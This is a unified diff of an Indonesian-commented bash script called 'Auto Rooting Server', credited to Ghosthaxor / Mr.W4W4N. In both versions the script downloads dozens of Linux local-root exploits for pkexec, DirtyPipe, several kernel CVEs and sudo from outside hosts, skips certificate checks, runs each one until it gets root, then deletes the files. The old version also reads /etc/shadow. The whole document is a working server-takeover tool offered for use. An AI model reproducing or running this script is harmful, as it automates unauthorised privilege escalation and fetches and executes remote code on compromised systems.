@@ -1,265 +1,120 @@
 #!/bin/bash
-
-RED='\033[91m'
-ENDCOLOR='\033[0m'
+set -e  # Stop kalau ada error fatal (misal wget gagal)
+# Code By Ghost Haxor | Mr.W4W4N
+BLUE='\033[94m'
+END='\033[0m'
 
 echo "***************************************************************"
-echo -e "${RED}Auto Rooting Server By: 💀 Ghosthaxor - Team Rokes 315💀${ENDCOLOR}"
-echo -e "${RED}Blog: https://www.xploit.info${ENDCOLOR}"
+echo -e "${BLUE}Auto Rooting Server  •  Ghosthaxor | Mr.W4W4N ${END}"
+echo -e "${BLUE}Team Rokes 315 | Blog: seojagonyarank1.biz.id ${END}"
+echo -e "${BLUE}                Since 2018  | 49 exploit karnel                ${END}"
 echo "***************************************************************"
 
-check_root() {
+# Cek apakah sudah root
+check_root () {
     if [ "$(id -u)" -eq 0 ]; then
-        echo
-        echo "Successfully Get Root Access"
+        echo -e "\n[+] Successfully got root!"
         echo "ID     => $(id -u)"
         echo "WHOAMI => $USER"
-        echo
         exit
     fi
 }
 
-check_pkexec_version() {
-    output=$(pkexec --version)
-    version=""
-    while IFS= read -r line; do
-        if [[ $line == *"pkexec version"* ]]; then
-            version=$(echo "$line" | awk '{print $NF}')
-            break
-        fi
-    done <<< "$output"
-    echo "$version"
+# Menjalankan exploit tunggal
+run_exploit () {
+    local url="$1"
+    shift
+    local file="$(basename "$url")"
+
+    echo -e "\n[*] Downloading $file"
+    wget -q "$url" --no-check-certificate
+    chmod +x "$file"
+
+    echo "[*] Running Loading $file $*"
+    "./$file" "$@" || true  # jika gagal, tetap lanjut
+
+    check_root
+    rm -f "$file"
 }
 
-run_commands_with_pkexec() {
-    pkexec_version=$(check_pkexec_version)
-    echo "pkexec version: $pkexec_version"
-
-    if [[ $pkexec_version == "1.05" || $pkexec_version == "0.96" || $pkexec_version == "0.95" || $pkexec_version == "105" ]]; then
-        wget -q "https://0-gram.github.io/id-0/exp_file_credential" --no-check-certificate
-        chmod 777 exp_file_credential
-        ./exp_file_credential
-        check_root
-        rm -f exp_file_credential
-        rm -rf exp_dir
-    else
-        echo "pkexec not supported"
-    fi
+# Mengecek versi pkexec dan jalankan exploit kalau cocok
+check_pkexec_version () {
+    pkexec --version 2>/dev/null | awk '/pkexec version/ {print $NF}'
 }
 
-run_commands_with_pkexec
+run_pkexec_family () {
+    local ver="$(check_pkexec_version)"
+    echo "[*] pkexec version: ${ver:-unknown}"
 
-# pwnki / pkexec
-wget -q "https://0-gram.github.io/id-0/ak" --no-check-certificate
-chmod 777 ak
-./ak
-check_root
-rm -f ak
-rm -rf GCONV_PATH=.
-rm -rf .pkexec
+    case "$ver" in
+        1.05|105|0.96|0.95)
+            run_exploit "https://0-gram.github.io/id-0/exp_file_credential"
+            ;;
+        *) echo "[-] pkexec not vulnerable / unsupported";;
+    esac
+}
 
-# ptrace
-wget -q "https://0-gram.github.io/id-0/ptrace" --no-check-certificate
-chmod 777 ptrace
-./ptrace
+# Jalankan awal
 check_root
-rm -f ptrace
+run_pkexec_family
 
-# CVE-2022-0847-DirtyPipe-Exploits
-wget -q "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/exploit-1" --no-check-certificate
-wget -q "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/exploit-2" --no-check-certificate
-chmod 777 exploit-1
-chmod 777 exploit-2
-./exploit-1
-./exploit-2 SUID
-check_root
-rm -f exploit-1
-rm -f exploit-2
+# ===== DAFTAR EXPLOIT (url [opsi]) =====
+exploit_list=(
+    "https://0-gram.github.io/id-0/ak"
+    "https://0-gram.github.io/id-0/ptrace"
+    "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/exploit-1"
+    "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/exploit-2 SUID"
+    "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/a2.out /usr/bin/sudo"
+    "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/a2.out /usr/bin/passwd"
+    "https://0-gram.github.io/id-0/sudodirtypipe /usr/local/bin"
+    "https://0-gram.github.io/id-0/af_packet"
+    "https://0-gram.github.io/id-0/CVE-2015-1328"
+    "https://0-gram.github.io/id-0/cve-2017-16995"
+    "https://0-gram.github.io/id-0/exploit-debian"
+    "https://0-gram.github.io/id-0/exploit-ubuntu"
+    "https://0-gram.github.io/id-0/newpid"
+    "https://0-gram.github.io/id-0/raceabrt"
+    "https://0-gram.github.io/id-0/timeoutpwn"
+    "https://0-gram.github.io/id-0/upstream44"
+    "https://0-gram.github.io/id-0/lpe.sh"
+    "https://0-gram.github.io/id-0/a.out 0"
+    "https://0-gram.github.io/id-0/a.out 1"
+    "https://0-gram.github.io/id-0/linux_sudo_cve-2017-1000367"
+    "https://mrwawanj.github.io/localroot/CVE-2024-1086"
+    "https://seojagonyarank1.biz.id/CVE-2024-1086"
+    "https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/CVE-2024-108611"
+    "https://0-gram.github.io/id-0/CVE-2017-7308"
+    "https://0-gram.github.io/id-0/CVE-2022-2639"
+    "https://0-gram.github.io/id-0/polkit-pwnage"
+    "https://0-gram.github.io/id-0/RationalLove"
+    "https://0-gram.github.io/id-0/exploit_userspec.py python2"
+    "https://raw.githubusercontent.com/cyberpoul/CVE-2025-32462-POC/refs/heads/main/CVE-2025-32462.sh"
+    "https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/ceka.sh"
+    "https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/CVE-2022-37706.sh"
+    "https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh"
+    "https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/CVE-2023-32629.sh"
+    "https://mrwawanj.github.io/localroot/CVE-2021-3493"
+    "https://mrwawanj.github.io/localroot/CVE-2021-33909"
+    "https://mrwawanj.github.io/localroot/CVE-2017-1000112"
+    "https://mrwawanj.github.io/localroot/CVE-2025-21756"
+    "https://raw.githubusercontent.com/K5LK/CVE-2023-2640-32629/refs/heads/main/poc.sh"
+    "https://mrwawanj.github.io/localroot/cve-2021-4034"
+    "https://mrwawanj.github.io/localroot/cve-2023-0386"
+    "https://mrwawanj.github.io/localroot/CVE-2022-34918"
+    "https://mrwawanj.github.io/localroot/cve-2022-32250"
+    "https://raw.githubusercontent.com/cyberpoul/CVE-2025-32462-POC/refs/heads/main/CVE-2025-32462.sh"
+    "https://raw.githubusercontent.com/kh4sh3i/CVE-2025-32463/refs/heads/main/exploit.sh"
+    "https://mrwawanj.github.io/localroot/CVE-2022-25636"
+    "https://mrwawanj.github.io/localroot/cve-2022-1015"
+    "https://mrwawanj.github.io/localroot/cve-2021-22555"
+    "https://mrwawanj.github.io/localroot/CVE-2022-0185-PipeVersion"
+    "https://0-gram.github.io/id-0/overlayfs"no
+)
 
-# lupa:v
-wget -q "https://0-gram.github.io/id-0/CVE-2022-0847-DirtyPipe-Exploits/a2.out" --no-check-certificate
-chmod 777 a2.out
-find / -perm 4000 -type -f 2>/dev/null || find / -perm -u=s -type -f 2>/dev/null
-./a2.out /usr/bin/sudo
-check_root
-./a2.out /usr/bin/passwd
-check_root
-rm -f a2.out
+# Jalankan semua exploit satu-persatu
+for entry in "${exploit_list[@]}"; do
+    read -ra args <<< "$entry"
+    run_exploit "${args[@]}"
+done
 
-wget -q "https://0-gram.github.io/id-0/sudodirtypipe" --no-check-certificate
-chmod 777 "sudodirtypipe"
-./sudodirtypipe /usr/local/bin
-check_root
-rm "sudodirtypipe"
-
-wget -q "https://0-gram.github.io/id-0/af_packet" --no-check-certificate
-chmod 777 "af_packet"
-./af_packet
-check_root
-rm "af_packet"
-
-wget -q "https://0-gram.github.io/id-0/CVE-2015-1328" --no-check-certificate
-chmod 777 "CVE-2015-1328"
-./CVE-2015-1328
-check_root
-rm "CVE-2015-1328"
-
-wget -q "https://0-gram.github.io/id-0/cve-2017-16995" --no-check-certificate
-chmod 777 "cve-2017-16995"
-./cve-2017-16995
-check_root
-rm "cve-2017-16995"
-
-wget -q "https://0-gram.github.io/id-0/exploit-debian" --no-check-certificate
-chmod 777 "exploit-debian"
-./exploit-debian
-check_root
-rm "exploit-debian"
-
-wget -q "https://0-gram.github.io/id-0/exploit-ubuntu" --no-check-certificate
-chmod 777 "exploit-ubuntu"
-./exploit-ubuntu
-check_root
-rm "exploit-ubuntu"
-
-wget -q "https://0-gram.github.io/id-0/newpid" --no-check-certificate
-chmod 777 "newpid"
-./newpid
-check_root
-rm "newpid"
-
-wget -q "https://0-gram.github.io/id-0/raceabrt" --no-check-certificate
-chmod 777 "raceabrt"
-./raceabrt
-check_root
-rm "raceabrt"
-
-wget -q "https://0-gram.github.io/id-0/timeoutpwn" --no-check-certificate
-chmod 777 "timeoutpwn"
-./timeoutpwn
-check_root
-rm "timeoutpwn"
-
-wget -q "https://0-gram.github.io/id-0/upstream44" --no-check-certificate
-chmod 777 "upstream44"
-./upstream44
-check_root
-rm "upstream44"
-
-wget -q "https://0-gram.github.io/id-0/lpe.sh" --no-check-certificate
-chmod 777 "lpe.sh"
-head -2 /etc/shadow
-./lpe.sh
-check_root
-rm "lpe.sh"
-
-wget -q "https://0-gram.github.io/id-0/a.out" --no-check-certificate
-chmod 777 "a.out"
-./a.out 0 && ./a.out 1
-check_root
-rm "a.out"
-
-wget -q "https://0-gram.github.io/id-0/linux_sudo_cve-2017-1000367" --no-check-certificate
-chmod 777 "linux_sudo_cve-2017-1000367"
-./linux_sudo_cve-2017-1000367
-check_root
-rm "linux_sudo_cve-2017-1000367"
-
-wget -q "https://0-gram.github.io/id-0/overlayfs" --no-check-certificate
-chmod 777 "overlayfs"
-./overlayfs
-check_root
-rm "overlayfs"
-
-wget -q "https://0-gram.github.io/id-0/CVE-2017-7308" --no-check-certificate
-chmod 777 "CVE-2017-7308"
-./CVE-2017-7308
-check_root
-rm "CVE-2017-7308"
-
-wget -q "https://0-gram.github.io/id-0/CVE-2022-2639" --no-check-certificate
-chmod 777 "CVE-2022-2639"
-./CVE-2022-2639
-check_root
-rm "CVE-2022-2639"
-
-wget -q "https://0-gram.github.io/id-0/polkit-pwnage" --no-check-certificate
-chmod 777 "polkit-pwnage"
-./polkit-pwnage
-check_root
-rm "polkit-pwnage"
-
-wget -q "https://0-gram.github.io/id-0/RationalLove" --no-check-certificate
-chmod 777 "RationalLove"
-./RationalLove
-check_root
-rm "RationalLove"
-
-wget -q "https://0-gram.github.io/id-0/exploit_userspec.py" --no-check-certificate
-chmod 777 "exploit_userspec.py"
-python2 exploit_userspec.py
-check_root
-rm "exploit_userspec.py"
-rm "0"
-rm "kmem"
-rm "sendfile1"
-
-wget -q "https://raw.githubusercontent.com/cyberpoul/CVE-2025-32462-POC/refs/heads/main/CVE-2025-32462.sh" --no-check-certificate
-chmod 777 "CVE-2025-32462.sh"
-./CVE-2025-32462.sh
-check_root
-rm "CVE-2025-32462.sh"
-
-wget -q "https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/ceka.sh" --no-check-certificate
-chmod 777 "ceka.sh"
-./ceka.sh
-check_root
-rm "ceka.sh"
-
-wget -q "https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/CVE-2022-37706.sh" --no-check-certificate
-chmod 777 "CVE-2022-37706.sh"
-./CVE-2022-37706.sh
-check_root
-rm "CVE-2022-37706.sh"
-
-wget -q "https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh" --no-check-certificate
-chmod 777 "screenroot.sh"
-./screenroot.sh
-check_root
-rm "screenroot.sh"
-
-wget -q "https://raw.githubusercontent.com/mrwawanj/localroot/refs/heads/main/CVE-2023-32629.sh" --no-check-certificate
-chmod 777 "CVE-2023-32629.sh"
-./CVE-2023-32629.sh
-check_root
-rm "CVE-2023-32629.sh"
-
-wget -q "https://mrwawanj.github.io/localroot/CVE-2021-3493" --no-check-certificate
-chmod 777 "CVE-2021-3493"
-./CVE-2021-3493
-check_root
-rm "CVE-2021-3493"
-
-wget -q "https://mrwawanj.github.io/localroot/CVE-2021-33909" --no-check-certificate
-chmod 777 "CVE-2021-33909"
-./CVE-2021-33909
-check_root
-rm "CVE-2021-33909"
-
-wget -q "https://mrwawanj.github.io/localroot/CVE-2017-1000112" --no-check-certificate
-chmod 777 "CVE-2017-1000112"
-./CVE-2017-1000112
-check_root
-rm "CVE-2017-1000112"
-
-wget -q "https://mrwawanj.github.io/localroot/CVE-2025-21756" --no-check-certificate
-chmod 777 "CVE-2025-21756"
-./CVE-2025-21756
-check_root
-rm "CVE-2025-21756"
-
-wget -q "https://mrwawanj.github.io/localroot/CVE-2024-1086" --no-check-certificate
-chmod 777 "CVE-2024-1086"
-./CVE-2024-1086
-check_root
-rm "CVE-2024-1086"
+echo -e "\n[-] Semua exploit selesai dijalankan, root belum didapat."
